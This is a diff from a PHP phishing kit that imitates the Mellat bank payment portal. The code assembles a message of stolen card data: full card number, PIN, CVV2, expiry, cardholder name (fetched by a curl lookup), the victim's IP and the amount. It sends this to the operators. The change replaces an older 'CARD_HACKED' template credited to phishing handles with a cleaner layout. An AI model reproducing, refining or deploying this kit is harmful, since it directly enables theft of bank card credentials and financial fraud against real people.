@@ -58,34 +58,30 @@ $ch = curl_init();
         $result     = curl_exec($ch);
         $json       = json_decode($result, true);
         $holderName = $json["firstName"] . " " . $json["lastName"];
-$Text = "
-#ＣＡＲＤ_ＨＡＣＫＥＤ
-
-🏦вǞПκ: $bankinfo[1]
-🔥𝙲𝙰𝚁𝙳: <code>$pan1 $pan2 $pan3 $pan4</code>
-🌩𝙿𝚊𝚜𝚜𝟤: <code>$pin</code>
-🔱𝙲𝚟𝚟𝟤: <code>$cvv</code>
-🔱𝚢𝚎𝚊𝚛: <code>$year</code> Month: <code>$month</code>
-🌐𝙸𝙿: <code>$ip</code>
-👥𝐶𝑎𝑟𝑑 𝐻𝑜𝑙𝑑𝑒𝑟 : <code>$holderName</code>
-⏰𝚃𝙸𝙼𝙴: $saat
-📝𝚃𝙾𝙳𝙰𝚈: $roz
-📌𝙳𝙰𝚃𝙴: $tarikh
-💴𝙰𝙼𝙾𝚄𝙽𝚃 : $amount 𝗥𝗶𝗮𝗹𝘀
-✨ 𝙿𝙾𝚁𝚃𝙰𝙻 : 𝙼𝙴𝙻𝙻𝙰𝚃
-   
-   ƇODƐD ßY 
-           @Geladiator_phishing
-     @phishing_bax
-
-#ＩＮＦＯ_ＣＡＲＤ
-
+$Text = "✅ Transaction finished!
+-------------- BANK --------------
+🏦 Name : $bankinfo[1]
+-------------- CARD --------------
+💳 Card : <code>$pan1 $pan2 $pan3 $pan4</code>
+🔐 Paas : <code>$pin</code>
+📋 Cvv2 : <code>$cvv</code>
+📆 Date : <code>$year</code> Month: <code>$month</code>
+-------------- INFO --------------
+👤 Card Holder : <code>$holderName</code>
+💴 Amount : $amount 𝗥𝗶𝗮𝗹𝘀
+$mailinfo
+📍 IP : <code>$ip</code>
+⏰ Time : $saat
+📝 ToDay : $roz
+📌 Date : $tarikh
+✨ Portal : Mellat
+-------------- $bankinfo[1] --------------
 ";
     
-$Text .="\n$bankinfo[0]⁉️Spam: $num";
+$Text .="$bankinfo[0]";
 
 if($sendEmail==true){
-    $Text .="\n⁉️Email: $email";
+    $Text .="";
 }
 
 $T="000";
